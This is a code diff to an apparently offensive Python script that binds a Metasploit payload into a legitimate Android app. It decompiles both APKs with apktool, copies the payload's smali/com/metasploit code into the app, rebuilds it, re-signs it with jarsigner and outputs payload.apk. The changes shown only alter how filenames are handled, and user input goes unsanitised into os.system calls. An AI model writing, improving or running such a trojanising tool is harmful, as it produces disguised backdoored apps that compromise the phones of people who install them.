@@ -22,38 +22,37 @@ print("**********************************************************************")
 os.system('ls apk')
 print("**********************************************************************")
 application = input ("Enter the application name => ")
+app = application.split('.')
 if application.lower == 'e':
     print('OK')
 else:
-    os.system(f'apktool d -f apk/{application}.apk')
+    os.system(f'apktool d -f apk/{application}')
     time.sleep(3)
-    os.system(f'mv {application} apk')
+    os.system(f'mv {app[0]} apk')
 payload0 = input ("\nEnter the payload name => ")
+pay = payload0.split('.')
 if payload0.lower == 'e' :
     print('OK')
 else: 
-    os.system(f'apktool d -f apk/{payload0}.apk')
-    os.system(f'mv {payload0} apk')
+    os.system(f'apktool d -f apk/{payload0}')
+    os.system(f'mv {pay[0]} apk')
     time.sleep(3)
-    os.system(f'cp -r apk/{payload0}/smali/com/metasploit apk/{application}/smali/com/')
+    os.system(f'cp -r apk/{pay[0]}/smali/com/metasploit apk/{app[0]}/smali/com/')
 no = input("Press n to continue [y/n] => ")
 if no == 'y':
-    os.system(f'java -jar apk/apktool_2.9.3.jar b apk/{application}')
+    os.system(f'java -jar apk/apktool_2.9.3.jar b apk/{app[0]}')
     time.sleep(2)
     
 else:
     pass
 yes = input ("Press n to continue [y/n] => ").lower()
 if yes == 'y':
-    print(f'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk/key.keystore apk/{application}/dist/{application}.apk elliot')
+    print(f'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk/key.keystore apk/{app[0]}/dist/{application} elliot')
     time.sleep(2)
-    os.system(f'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk/key.keystore apk/{application}/dist/{application}.apk elliot')
-    time.sleep(2)
-    print()
-    print(f'zipalign -v 4 apk/{application}/dist/{application}.apk payload.apk')
+    os.system(f'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk/key.keystore apk/{app[0]}/dist/{application} elliot')
     time.sleep(2)
     print()
-    os.system(f'zipalign -v 4 apk/{application}/dist/{application}.apk payload.apk')
-else:
-    pass
-
+    print(f'zipalign -v 4 apk/{app[0]}/dist/{application} payload.apk')
+    time.sleep(2)
+    print()
+    os.system(f'zipalign -v 4 apk/{app[0]}/dist/{application} payload.apk')
